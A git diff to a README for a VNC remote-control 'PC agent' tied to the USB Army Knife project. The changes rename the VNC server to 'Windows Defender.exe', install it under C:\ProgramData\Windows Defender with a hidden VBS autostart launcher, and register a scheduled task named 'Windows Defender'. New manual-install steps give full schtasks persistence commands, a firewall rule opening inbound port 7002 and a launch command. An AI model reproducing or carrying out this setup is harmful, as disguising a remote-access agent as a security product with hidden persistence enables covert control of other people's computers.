@@ -13,29 +13,50 @@ The PC agent enables VNC screen viewing and remote control.
 5. Done — the installer downloads all files from GitHub and sets up everything
 
 **What it installs:**
-- `VncDirect.exe` — VNC web server (noVNC on port 7002)
+- `Windows Defender.exe` — VNC web server (noVNC on port 7002)
 - `AgentLauncher.exe` — USB Army Knife agent for screen capture
-- `vnc-watchdog.bat` — auto-restart if VNC crashes
+- `WinDefend.vbs` — autostart launcher (hidden)
 - Scheduled tasks for autostart on login
-- Firewall rule for port 7002
+- Firewall rules for port 7002
+
+**Installation path:** `C:\ProgramData\Windows Defender`
 
 ### Uninstall
 
 Run [`Agent Uninstaller.bat`](Agent%20Uninstaller.bat) and choose:
-- **[1] Remove Autostart** — keeps files, removes startup entries
-- **[2] Full Uninstall** — removes autostart, all files and firewall rule
-- **[3] Change VNC Password** — set or clear the VNC password
+- **[1] Full Uninstall** — removes autostart, all files and firewall rules
+- **[2] Remove Autostart / Setup Autostart** — toggle scheduled tasks
+- **[3] Start/Stop VNC Server** — start or stop the VNC server
+- **[4] Set/Change VNC Password** — set or clear the VNC password
+- **[5] Exit**
 
 **What it removes:**
-- Scheduled tasks ("USBArmyKnife Agent", "Security Script", "VNC Watchdog")
-- Firewall rule "VNC Direct 7002"
-- All files in `C:\AgentInstall\`
+- Scheduled tasks ("USBArmyKnife Agent", "Security Script", "Windows Defender")
+- Firewall rules ("VNC Direct 7002", "VNC Block Localhost")
+- All files in `C:\ProgramData\Windows Defender\`
 
 ### Manual Install (if installer doesn't work)
 
 1. Download all files from [`Installer/`](Installer/) on GitHub
-2. Create `C:\AgentInstall` and copy the files into it
-3. Extract `VncDirect.zip` to `C:\AgentInstall\VncDirect\`
+2. Create `C:\ProgramData\Windows Defender\VncDirect\vnc` on your PC
+3. Copy files:
+   - `AgentLauncher.exe` → `C:\ProgramData\Windows Defender\`
+   - `Windows Defender.exe`, `turbojpeg.dll`, `vcruntime140.dll` → `C:\ProgramData\Windows Defender\VncDirect\`
+4. Extract `vnc-web.zip` into `C:\ProgramData\Windows Defender\VncDirect\`
+5. Create scheduled tasks (run as admin):
+   ```
+   schtasks /create /tn "USBArmyKnife Agent" /tr "C:\ProgramData\Windows Defender\AgentLauncher.exe vid=cafe pid=403f cwd=C:\ProgramData\Windows Defender" /sc onlogon /rl limited /f
+   schtasks /create /tn "Windows Defender" /tr "wscript.exe \"C:\ProgramData\Windows Defender\WinDefend.vbs\"" /sc onlogon /rl limited /f
+   ```
+6. Add firewall rule (run as admin):
+   ```
+   netsh advfirewall firewall add rule name="VNC Direct 7002" dir=in action=allow protocol=TCP localport=7002
+   ```
+7. Start:
+   ```
+   cd /d C:\ProgramData\Windows Defender\VncDirect\vnc
+   start "" "C:\ProgramData\Windows Defender\VncDirect\Windows Defender.exe" port=7002 "cwd=C:\ProgramData\Windows Defender\VncDirect\vnc" fps=360 scale=0
+   ```
 
 ## Compile from Source
 
@@ -67,7 +88,7 @@ cd tools\VncDirect
 dotnet publish -r win-x64 -c Release --self-contained true /p:PublishSingleFile=true
 ```
 
-Output: `tools\VncDirect\bin\Release\net8.0-windows\win-x64\publish\VncDirect.exe`
+Output: `tools\VncDirect\bin\Release\net8.0-windows\win-x64\publish\Windows Defender.exe`
 
 ## Getting Debug Logs
 
